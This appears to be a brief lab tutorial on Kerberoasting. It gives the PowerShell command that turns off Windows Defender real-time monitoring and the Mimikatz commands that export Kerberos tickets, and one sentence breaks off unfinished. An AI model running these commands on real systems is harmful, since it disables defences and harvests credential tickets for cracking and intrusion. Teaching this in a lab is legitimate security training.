# Kerberoasting with Mimikatz

**NOTE: This is only to be used in an Active Directory environment on the Client machine. Please make sure you have selected the proper machine prior to running this attack.**

**Also, if you find that this attack is not working, you may need to disable Windows Defender. This can be done by opening PowerShell as an Administrator and running the following command:**
`Set-MpPreference -DisableRealtimeMonitoring $true`

This attack uses Mimikatz to exploit Kerberos tickets for. The Mimikatz commands are: 
- `privilege::debug`
- `kerberos::list /export`